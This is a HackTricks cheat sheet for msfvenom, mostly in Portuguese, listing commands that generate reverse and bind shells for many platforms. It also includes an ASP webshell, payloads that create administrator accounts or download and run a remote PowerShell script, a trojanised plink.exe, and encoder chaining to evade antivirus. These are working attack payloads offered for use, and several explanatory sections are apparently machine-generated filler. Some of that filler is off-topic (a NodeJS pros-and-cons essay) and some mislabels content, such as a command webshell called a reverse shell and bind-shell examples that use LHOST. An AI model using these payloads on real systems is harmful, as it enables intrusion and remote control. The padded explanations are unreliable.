# MSFVenom - CheatSheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Também é possível usar o `-a` para especificar a arquitetura ou a `--platform`

## Listagem
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parâmetros comuns ao criar um shellcode

Ao criar um shellcode, existem alguns parâmetros comuns que podem ser utilizados para personalizar o código gerado. Esses parâmetros permitem que você defina o tipo de payload, a arquitetura do sistema alvo, o formato de saída e outras opções relevantes. Abaixo estão alguns dos parâmetros mais comuns:

- **Payload**: Especifica o tipo de payload que será usado no shellcode, como um shell reverso ou um payload de execução de comandos.
- **Arquitetura**: Define a arquitetura do sistema alvo, como x86, x64 ou ARM.
- **Formato de saída**: Determina o formato de saída do shellcode, como raw, exe, elf ou macho.
- **Bad characters**: Permite especificar caracteres que devem ser evitados no shellcode, como caracteres nulos ou caracteres que podem causar problemas de codificação.
- **Encoder**: Define o encoder a ser usado para ofuscar o shellcode e evitar detecção, como o encoder XOR ou o encoder Shikata Ga Nai.
- **Tamanho**: Especifica o tamanho máximo do shellcode gerado.
- **Endereço de retorno**: Define o endereço de retorno para o shellcode, geralmente usado em ataques de estouro de buffer.

Esses parâmetros podem ser ajustados de acordo com as necessidades específicas do seu teste de penetração, permitindo que você crie um shellcode personalizado e eficaz para explorar vulnerabilidades em sistemas alvo.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
O shell reverso é uma técnica comum usada em testes de penetração para obter acesso remoto a um sistema Windows. Ele permite que um invasor estabeleça uma conexão de rede de volta ao seu próprio sistema, fornecendo assim controle total sobre o sistema alvo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads de shell reverso para sistemas Windows. O `msfvenom` permite personalizar o payload de acordo com as necessidades do invasor, como o endereço IP e a porta para a conexão reversa.

Aqui está um exemplo de como usar o `msfvenom` para gerar um payload de shell reverso para um sistema Windows:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f exe > shell.exe
```

Neste exemplo, substitua `<seu endereço IP>` pelo endereço IP do seu sistema e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de gerar o payload, você pode transferi-lo para o sistema alvo e executá-lo. Assim que o payload for executado, ele estabelecerá uma conexão reversa com o seu sistema, permitindo que você execute comandos no sistema alvo.

É importante lembrar que o uso de técnicas de hacking como o shell reverso em sistemas sem permissão é ilegal e pode resultar em consequências legais graves. Portanto, sempre obtenha permissão por escrito antes de realizar qualquer teste de penetração.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
Uma shell de bind é uma técnica de hacking em que um programa malicioso é implantado em um sistema alvo para abrir uma porta de escuta. Isso permite que um invasor se conecte remotamente ao sistema comprometido e execute comandos nele. A shell de bind é chamada assim porque "amarrada" ao número da porta específica em que está escutando. Isso permite que o invasor se conecte à porta especificada e obtenha acesso ao sistema comprometido.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example of how to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe` that, when executed on a Windows system, will create a user with the specified username and password.

You can customize the payload by changing the `USER` and `PASS` parameters to the desired username and password, respectively.

Once you have generated the payload, you can deliver it to the target system using various methods, such as social engineering or exploiting vulnerabilities.

Remember to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

O shell CMD é um shell de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos de texto. É uma ferramenta poderosa para executar tarefas administrativas e automatizar processos no Windows.

O shell CMD pode ser usado para executar comandos, scripts e programas no Windows. Ele fornece uma interface de linha de comando para executar várias operações, como criar, copiar, excluir e renomear arquivos, gerenciar serviços, configurar redes e muito mais.

O shell CMD também suporta a execução de comandos em lote, que são arquivos de texto contendo uma sequência de comandos que podem ser executados em sequência. Isso permite a automação de tarefas repetitivas e a execução de várias operações em um único comando.

Para acessar o shell CMD, basta abrir o prompt de comando do Windows e digitar os comandos desejados. O shell CMD oferece uma ampla gama de comandos e opções que podem ser explorados para realizar várias tarefas no sistema operacional Windows.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Executar Comando**

The `msfvenom` tool can be used to generate payloads that allow for command execution on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <output format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `<output format>` can be any format supported by `msfvenom`, such as `raw`, `elf`, `exe`, `dll`, `psh`, `asp`, `jsp`, `war`, `pl`, `py`, `rb`, `ps1`, `hta`, `c`, `cpp`, `java`, `msi`, `msu`, `vba`, `vbs`, `hta-psh`, `asp-psh`, `jsp-psh`, `war-psh`, `pl-psh`, `py-psh`, `rb-psh`, `ps1-psh`, `c-psh`, `cpp-psh`, `java-psh`, `msi-psh`, `msu-psh`, `vba-psh`, or `vbs-psh`.

The `<output file>` is the name of the file that will contain the generated payload.

Once the payload is generated, you can transfer it to the target system and execute it to gain command execution.

Note: It is important to use this technique responsibly and only on systems that you have proper authorization to test. Unauthorized use of this technique can lead to legal consequences.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador

O codificador é uma ferramenta essencial no arsenal de um hacker. Ele é usado para ofuscar o payload e evitar a detecção pelos sistemas de segurança. O Metasploit Framework fornece uma variedade de codificadores que podem ser usados com o `msfvenom` para criar payloads personalizados.

#### Codificadores disponíveis

Aqui estão alguns dos codificadores disponíveis no Metasploit Framework:

- `x86/shikata_ga_nai`: Este codificador é baseado em metamorfose e é eficaz contra sistemas de detecção de assinaturas.
- `x86/jmp_call_additive`: Este codificador usa instruções `jmp` e `call` para ofuscar o payload.
- `x86/call4_dword_xor`: Este codificador usa instruções `call` e `xor` para ofuscar o payload.

#### Uso do codificador

Para usar um codificador com o `msfvenom`, você precisa especificar o codificador desejado usando a opção `-e` seguida pelo nome do codificador. Por exemplo, para usar o codificador `x86/shikata_ga_nai`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -e x86/shikata_ga_nai -f exe > payload.exe
```

Isso criará um payload do tipo `exe` usando o codificador `x86/shikata_ga_nai`.

#### Personalização do codificador

Você também pode personalizar o codificador especificando opções adicionais. Por exemplo, você pode definir o número de iterações usando a opção `-i`. Quanto maior o número de iterações, mais ofuscado será o payload. Você também pode usar a opção `-b` para especificar caracteres proibidos que devem ser evitados no payload.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe > payload.exe
```

Neste exemplo, o codificador `x86/shikata_ga_nai` será usado com 5 iterações e os caracteres `\x00`, `\x0a` e `\x0d` serão evitados no payload.

Experimente diferentes codificadores e opções para encontrar a combinação que melhor se adapta às suas necessidades de evasão.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incorporado dentro do executável

O `msfvenom` pode ser usado para incorporar um payload dentro de um executável existente. Isso permite que você execute o payload sem chamar a atenção, pois ele estará oculto dentro do arquivo executável original. Para fazer isso, você precisa especificar o arquivo executável de destino usando a opção `-x` e o payload que deseja incorporar usando a opção `-p`. Por exemplo:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -x /path/to/original.exe -f exe > /path/to/output.exe
```

Isso criará um novo arquivo executável chamado `output.exe`, que conterá o payload incorporado. Quando o `output.exe` for executado, o payload será ativado e estabelecerá uma conexão reversa com o endereço IP e porta especificados.

Certifique-se de escolher um arquivo executável adequado para incorporar o payload, pois ele deve ser compatível com o sistema operacional e a arquitetura alvo. Além disso, lembre-se de que a incorporação de um payload em um executável existente pode alterar a assinatura digital do arquivo, o que pode ser detectado por sistemas de segurança. Portanto, é importante considerar as medidas de evasão adequadas para evitar a detecção.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### Shell Reverso

O shell reverso é uma técnica comumente usada em testes de penetração para obter acesso remoto a um sistema Linux. Ele permite que um invasor estabeleça uma conexão de rede de volta ao seu próprio sistema, fornecendo assim controle total sobre o sistema alvo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads de shell reverso personalizados. O `msfvenom` é uma ferramenta poderosa que permite aos hackers criar payloads maliciosos para explorar vulnerabilidades em sistemas Linux.

Aqui está um exemplo de como usar o `msfvenom` para gerar um payload de shell reverso:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <nome do arquivo de saída>
```

Substitua `<seu endereço IP>` pelo endereço IP do seu sistema e `<porta>` pela porta que você deseja usar para a conexão reversa. O `<formato>` pode ser qualquer formato suportado pelo `msfvenom`, como `elf`, `raw`, `c`, `exe`, entre outros. O `<nome do arquivo de saída>` é o nome do arquivo que conterá o payload gerado.

Depois de gerar o payload, você pode implantá-lo no sistema alvo e iniciar uma conexão reversa usando uma ferramenta como o Netcat ou o Metasploit Framework.

É importante lembrar que o uso de técnicas de shell reverso em sistemas sem autorização é ilegal e pode resultar em consequências legais graves. Portanto, sempre obtenha permissão por escrito antes de realizar qualquer teste de penetração.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
Uma shell de bind é uma técnica de hacking em que um programa malicioso é implantado em um sistema alvo para abrir uma porta de escuta. Isso permite que um invasor se conecte remotamente ao sistema e execute comandos nele. A shell de bind é chamada assim porque "amarrada" ao número da porta específica em que está escutando. Isso permite que o invasor se conecte à porta especificada e obtenha acesso ao sistema comprometido.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

O SunOS (Solaris) é um sistema operacional baseado em Unix desenvolvido pela Sun Microsystems. Ele é amplamente utilizado em servidores e estações de trabalho. O Solaris é conhecido por sua estabilidade, segurança e desempenho. É importante entender as peculiaridades do Solaris ao realizar testes de penetração e exploração.

#### Compilando payloads para o Solaris

O `msfvenom` é uma ferramenta poderosa que pode ser usada para gerar payloads personalizados para várias plataformas, incluindo o Solaris. Aqui estão alguns exemplos de como compilar payloads para o Solaris usando o `msfvenom`:

##### Payload de acesso reverso

```
msfvenom -p solaris/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f elf > shell.elf
```

##### Payload de bind shell

```
msfvenom -p solaris/x86/shell_bind_tcp RHOST=<endereço IP do alvo> LPORT=<sua porta> -f elf > shell.elf
```

#### Executando payloads no Solaris

Depois de compilar o payload, você pode transferi-lo para o sistema Solaris e executá-lo. Aqui estão algumas maneiras de fazer isso:

##### Transferência de arquivos usando o `nc`

No seu sistema de ataque:

```
nc -lvp <sua porta> < shell.elf
```

No sistema Solaris:

```
nc <seu endereço IP> <sua porta> > shell.elf
```

##### Transferência de arquivos usando o `wget`

No sistema Solaris:

```
wget http://<seu endereço IP>/shell.elf -O shell.elf
```

#### Considerações finais

Ao realizar testes de penetração no Solaris, é importante ter um bom entendimento do sistema operacional e das técnicas de hacking relevantes. O `msfvenom` pode ser uma ferramenta útil para gerar payloads personalizados para o Solaris. No entanto, lembre-se sempre de obter permissão adequada antes de realizar qualquer teste de penetração.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **Shell Reverso:**

O shell reverso é uma técnica comum usada em pentest para estabelecer uma conexão de rede reversa entre o alvo e o atacante. Isso permite que o atacante assuma o controle do sistema comprometido e execute comandos remotamente.

O `msfvenom` é uma ferramenta poderosa que faz parte do framework Metasploit. Ele permite gerar payloads personalizados para várias plataformas, incluindo o macOS.

Aqui está um exemplo de como gerar um payload de shell reverso para o macOS usando o `msfvenom`:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f macho > shell.macho
```

Neste exemplo, substitua `<seu endereço IP>` pelo endereço IP do seu servidor de escuta e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de gerar o payload, você pode implantá-lo no sistema de destino e iniciar o servidor de escuta para receber a conexão reversa.

Lembre-se de que o uso de técnicas de hacking sem permissão é ilegal e pode ter consequências graves. Certifique-se de obter autorização adequada antes de realizar qualquer teste de penetração.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A **Bind Shell** is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the shell provides a command-line interface to interact with the target system. This type of shell is commonly used in scenarios where the attacker has control over the target's network and wants to establish a persistent backdoor.

To create a bind shell payload using **msfvenom**, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The file to save the generated payload.

For example, to create a bind shell payload for a Windows target, listening on port 4444, and save it as an executable file named `payload.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp LHOST=<attacker IP> LPORT=4444 -f exe -o payload.exe
```

Remember to replace `<attacker IP>` with your actual IP address.

Once the payload is generated, you can transfer it to the target system and execute it to establish the bind shell.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Cargas úteis baseadas na web**

### **PHP**

#### Shell reverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
O seguinte é um exemplo de um shell reverso em ASP/x:

```asp
<%@ Language=VBScript %>
<%
    Dim cmd
    cmd = Request.QueryString("cmd")
    If cmd <> "" Then
        Dim oShell
        Set oShell = CreateObject("WScript.Shell")
        Dim oExec
        Set oExec = oShell.Exec(cmd)
        Dim output
        output = oExec.StdOut.ReadAll()
        Response.Write(output)
    End If
%>
```

Este código permite executar comandos no servidor alvo através de uma solicitação GET. Para usar o shell reverso, você precisa enviar uma solicitação GET com o parâmetro `cmd` contendo o comando que deseja executar. O resultado do comando será retornado como resposta.

Para criar um payload ASP/x usando o `msfvenom`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f asp > shell.asp
```

Substitua `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que deseja usar para a conexão reversa.

Depois de gerar o payload, você pode fazer o upload do arquivo `shell.asp` para o servidor alvo e acessá-lo através de uma solicitação GET para obter acesso ao shell reverso. Certifique-se de que o servidor esteja configurado para executar arquivos ASP/x.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
O seguinte é um exemplo de um shell reverso em JSP usando o msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f war > shell.war
```

Este comando irá gerar um arquivo WAR chamado `shell.war` que contém o shell reverso em JSP. Você pode implantar esse arquivo em um servidor web compatível com JSP para estabelecer uma conexão reversa com o seu sistema.

Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de implantar o arquivo WAR em um servidor web, você pode acessar o shell reverso em JSP usando o seguinte URL:

```
http://<endereço IP do servidor>/<caminho para o arquivo WAR>/shell.jsp
```

Isso permitirá que você execute comandos no sistema remoto através do shell reverso em JSP.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
A técnica de Reverse Shell é usada para estabelecer uma conexão entre o atacante e o alvo, permitindo que o atacante controle o sistema comprometido remotamente. O atacante envia um payload malicioso para o sistema alvo, que, quando executado, estabelece uma conexão de volta ao atacante. Isso permite que o atacante execute comandos no sistema alvo e obtenha acesso remoto completo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads maliciosos para diferentes tipos de shells reversos. O `msfvenom` é uma ferramenta poderosa que permite personalizar o payload de acordo com as necessidades do atacante.

Aqui está um exemplo de como gerar um payload de Reverse Shell usando o `msfvenom`:

```plaintext
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: O tipo de payload que você deseja gerar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: O endereço IP do seu sistema, onde você deseja receber a conexão reversa.
- `<porta>`: A porta na qual você deseja receber a conexão reversa.
- `<formato>`: O formato de saída desejado, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: O nome do arquivo de saída onde o payload será salvo.

Depois de gerar o payload, você pode enviá-lo para o sistema alvo e executá-lo. Assim que o payload for executado, uma conexão reversa será estabelecida e você poderá controlar o sistema alvo remotamente.

É importante lembrar que o uso de técnicas de hacking sem autorização é ilegal e pode resultar em consequências legais graves. Este conhecimento deve ser usado apenas para fins educacionais e éticos.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS é uma plataforma de desenvolvimento de aplicativos de código aberto que permite a execução de JavaScript no lado do servidor. Ele utiliza o mecanismo de JavaScript do Chrome para fornecer um ambiente de execução rápido e eficiente. O NodeJS é amplamente utilizado para criar aplicativos web escaláveis e em tempo real, bem como para desenvolver ferramentas de linha de comando.

#### Benefícios do NodeJS

- **Desempenho**: O NodeJS é conhecido por seu desempenho excepcionalmente rápido devido ao seu modelo de E/S não bloqueante. Isso permite que o NodeJS lide com um grande número de conexões simultâneas sem sobrecarregar o servidor.

- **Escalabilidade**: O NodeJS é altamente escalável, permitindo que os aplicativos lidem com um grande número de solicitações simultâneas de forma eficiente. Ele também suporta a criação de aplicativos em tempo real, como bate-papos e jogos multiplayer.

- **Ecossistema robusto**: O NodeJS possui um ecossistema rico de pacotes e bibliotecas disponíveis através do gerenciador de pacotes npm. Isso facilita o desenvolvimento de aplicativos complexos, pois muitas funcionalidades já estão disponíveis como pacotes prontos para uso.

- **Facilidade de desenvolvimento**: O NodeJS utiliza JavaScript, uma linguagem de programação popular e amplamente utilizada, o que torna mais fácil para os desenvolvedores criar aplicativos web e compartilhar código entre o lado do cliente e o lado do servidor.

#### Desvantagens do NodeJS

- **Single-threaded**: O NodeJS é single-threaded, o que significa que ele não é adequado para tarefas intensivas de CPU. Se um aplicativo NodeJS exigir muita computação, ele pode bloquear o loop de eventos e afetar o desempenho geral do aplicativo.

- **Gerenciamento de memória**: O NodeJS usa um mecanismo de coleta de lixo para gerenciar a memória, o que pode levar a vazamentos de memória se não for usado corretamente. Os desenvolvedores precisam estar cientes disso e adotar boas práticas de gerenciamento de memória.

- **Curva de aprendizado**: Embora o JavaScript seja uma linguagem popular, o desenvolvimento de aplicativos NodeJS requer um entendimento sólido de conceitos assíncronos e programação orientada a eventos. Isso pode representar uma curva de aprendizado para desenvolvedores acostumados com abordagens de programação mais tradicionais.

#### Conclusão

O NodeJS é uma plataforma poderosa para o desenvolvimento de aplicativos web escaláveis e em tempo real. Com seu desempenho excepcional, escalabilidade e ecossistema robusto, o NodeJS é uma escolha popular entre os desenvolvedores. No entanto, é importante estar ciente das suas limitações, como a falta de suporte para tarefas intensivas de CPU e a necessidade de gerenciamento adequado de memória. Com o conhecimento adequado e as melhores práticas, o NodeJS pode ser uma ferramenta valiosa para criar aplicativos web modernos.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas úteis de Linguagem de Script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and frameworks that make it easier to develop hacking tools and scripts. Python's simplicity and readability make it an ideal choice for both beginners and experienced hackers.

Python can be used for various hacking tasks, such as network scanning, vulnerability assessment, exploit development, and post-exploitation activities. Its extensive standard library and third-party modules allow hackers to easily manipulate network packets, interact with databases, and perform various cryptographic operations.

In addition to its built-in capabilities, Python also supports the use of external tools and frameworks. One such tool is Metasploit, which is a popular framework for developing and executing exploits. Python can be used with Metasploit to create custom payloads and generate shellcode.

Python's versatility extends to its ability to run on multiple platforms, including Windows, Linux, and macOS. This makes it a convenient choice for hackers who need to work across different operating systems.

Overall, Python is a valuable tool for hackers due to its flexibility, ease of use, and extensive library support. Whether you are a beginner or an experienced hacker, Python can help you streamline your hacking activities and enhance your overall effectiveness.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash é uma linguagem de script amplamente utilizada em sistemas operacionais baseados em Unix. É uma das shells mais populares e oferece uma ampla gama de recursos e funcionalidades. O Bash é conhecido por sua flexibilidade e facilidade de uso, tornando-o uma escolha popular entre os hackers.

#### **Injeção de código Bash**

A injeção de código Bash é uma técnica comum usada por hackers para explorar vulnerabilidades em sistemas. Envolve a inserção de comandos Bash maliciosos em entradas de usuário não filtradas, permitindo que os hackers executem comandos arbitrários no sistema alvo.

#### **Execução de comandos Bash**

A execução de comandos Bash é uma técnica usada para executar comandos Bash em um sistema remoto. Os hackers podem explorar vulnerabilidades em sistemas para obter acesso remoto e executar comandos Bash para realizar várias atividades maliciosas, como roubo de dados, instalação de malware e comprometimento do sistema.

#### **Scripts Bash maliciosos**

Os scripts Bash maliciosos são programas de script escritos em Bash que são projetados para realizar atividades maliciosas em um sistema. Esses scripts podem ser usados para automatizar ataques, explorar vulnerabilidades e comprometer sistemas.

#### **Proteção contra ataques Bash**

Para proteger um sistema contra ataques Bash, é importante implementar práticas de segurança adequadas, como:

- Filtrar e validar todas as entradas de usuário para evitar injeção de código Bash.
- Manter o sistema operacional e o software atualizados com as últimas correções de segurança.
- Usar firewalls e sistemas de detecção de intrusão para monitorar e bloquear atividades suspeitas.
- Implementar políticas de senha fortes e autenticação de dois fatores para proteger o acesso ao sistema.
- Realizar testes de penetração regulares para identificar e corrigir vulnerabilidades antes que sejam exploradas por hackers.

Ao seguir essas práticas de segurança, é possível reduzir significativamente o risco de ataques Bash bem-sucedidos e proteger efetivamente um sistema contra hackers.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa depois que o bug for verificado.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
